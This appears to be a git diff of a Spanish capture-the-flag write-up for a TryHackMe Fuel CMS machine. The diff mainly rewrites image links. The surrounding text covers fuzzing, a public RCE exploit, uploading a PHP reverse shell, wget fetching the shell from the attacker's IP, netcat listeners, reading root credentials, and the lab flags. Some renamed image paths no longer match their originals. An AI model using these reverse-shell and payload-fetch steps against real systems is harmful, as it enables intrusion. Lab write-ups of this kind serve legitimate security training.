@@ -27,35 +27,35 @@ También podemos modificar los tiempos entre los paquetes para que sea más dif�
 sudo nmap -sV -O -T4 10.10.98.176
 ```
 
-![[Pasted image 20250204105623.png]]
+![Imagen](images/Pasted%20image%2020250204105623.png)
 
 ## Fuzzing 
 
 Accedemos a la página web y usamos `DirBuster` para hacer fuzzing a la URL mientras seguimos inspeccionando el contenido de la página.
 
-![[Pasted image 20250212170404.png]]
+![Imagen](images/Pasted%20image%2020250212170404.png)
 
 Descubrimos un login:
 
-![[Pasted image 20250212170436.png]]
+![Imagen](images/Pasted%20image%2020250212170436.png)
 
 El fuzzing nos da los mismos resultados:
 
-![[Pasted image 20250212170557.png]]
+![Imagen](images/Pasted%20image%2020250212170557.png)
 
 ## /fuel/
 
 Accedemos pues a `/fuel` y entramos con el usuario y contraseñas indicados.
 
-![[Pasted image 20250212170659.png]]
+![Imagen](images/Pasted%20image%2020250212170659.png)
 
 Accedimos a un panel de administración del sitio web.
 
-![[Pasted image 20250212170830.png]]
+![Imagen](images/Pasted%20image%2020250212170830.png)
 
 En la pestaña de `assets` podemos subir un archivo.
 
-![[Pasted image 20250212172318.png]]
+![Imagen](images/Pasted%20image%2020250212172318.png)
 
 Nos aprovecharemos de esto ahora mismo.
 
@@ -67,7 +67,7 @@ https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell
 
 La modificamos con la IP de la VPN de nuestro Kali y el puerto 4444:
 
-![[Pasted image 20250212172546.png]]
+![Imagen](images/Pasted%20image%2020250212172546.png)
 
 La página sólo permite subir archivos .zip pero podemos hacer que se descompriman automáticamente al subirlos.
 
@@ -83,25 +83,25 @@ nc -lvnp 4444
 
 Buscamos la vulnerabilidad de "fuel CMS" y encontramos la de la versión 1.4.1 de Remote Code Execution.
 
-![[Pasted image 20250212182655.png]]
+![Imagen](images/Pasted%20image%2020250212172655.png)
 
 Nos descargamos el exploit.
 
-![[Pasted image 20250212182715.png]]
+![Imagen](images/Pasted%20image%2020250212172715.png)
 
 Lo ejecutamos con el siguiente comando y accedemos al sistema finalmente.
 
-![[Pasted image 20250212182759.png]]
+![Imagen](images/Pasted%20image%2020250212172759.png)
 
 Aunque es una shell muy limitada actualmente, no nos permite hacer casi nada.
 
 Buscamos pues una reverse shell de php.
 
-![[Pasted image 20250220172524.png]]
+![Imagen](images/Pasted%20image%2020250220172524.png)
 
 Nos la descargamos y editamos unos parámetros. La IP es la de nuestro Kali en la VPN de Tryhackme, 10.8.3.33 y el puerto 5000.
 
-![[Pasted image 20250220172721.png]]
+![Imagen](images/Pasted%20image%2020250220172721.png)
 
 Abrimos una consola de`netcat`en escucha para el puerto 5000.
 
@@ -109,7 +109,7 @@ Abrimos una consola de`netcat`en escucha para el puerto 5000.
 nc -lvnp 5000 
 ```
 
-![[Pasted image 20250220172838.png]]
+![Imagen](images/Pasted%20image%2020250220172838.png)
 
 También abrimos un servidor http con Python por el puerto 9000.
 
@@ -119,11 +119,11 @@ python3 -m http.server 9000
 
 >IMPORTANTE: La reverse shell de php que vamos a utilizar tiene que estar en la misma carpeta desde la que abrimos el servidor de python.
 
-![[Pasted image 20250220173032.png]]
+![Imagen](images/Pasted%20image%2020250220173032.png)
 
 Hacemos clic en "RAW" en la página de github de antes de la reverse shell de php y copiamos la URL. 
 
-![[Pasted image 20250220173141.png]]
+![Imagen](images/Pasted%20image%2020250220173141.png)
 
 ```
 https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
@@ -135,21 +135,20 @@ Nos descargamos en el servidor la reverse shell que editamos.
 wget http://10.8.3.33:9000/shell.php
 ```
 
-![[Pasted image 20250220174600.png]]
+![Imagen](images/Pasted%20image%2020250220174600.png)
 
-![[Pasted image 20250220174621.png]]
+![Imagen](images/Pasted%20image%2020250220174600.png)
 
 Accedemos a la URL del archivo que hemos subido de php. La página se quedará cargando cuando se haya establecido la conexión.
-
-![[Pasted image 20250220174734.png]]
+![Imagen](images/Pasted%20image%2020250220174734.png)
 
 En el puerto que abrimos en escucha con `netcat`hemos establecido la conexión.
 
-![[Pasted image 20250220180034.png]]
+![Imagen](images/Pasted%20image%2020250220178034.png)
 
 Obtenemos la primera **flag**:
 
-![[Pasted image 20250220180225.png]]
+![Imagen](images/Pasted%20image%2020250220178225.png)
 
 ```
 6470e394cbf6dab6a91682cc8585059b
@@ -165,7 +164,7 @@ cd /var/www/html/fuel/application/config
 
 Y mostramos el fichero `database.php`. En él están las credenciales del usuario `root`.
 
-![[Pasted image 20250220180945.png]]
+![Imagen](images/Pasted%20image%2020250220170945.png)
 
 Hacemos más interactiva la terminal con el siguiente comando de python:
 
@@ -181,11 +180,11 @@ su root
 
 Y la contraseña es `mememe`.
 
-![[Pasted image 20250220182137.png]]
+![Imagen](images/Pasted%20image%2020250220172137.png)
 
 Finalmente, obtenemos la última flag que se encuentra en la carpeta `root`y en el fichero `root.txt`.
 
-![[Pasted image 20250220182314.png]]
+![Imagen](images/Pasted%20image%2020250220172314.png)
 
 ```
 b9bbcb33e11b80be759c4e844862482d
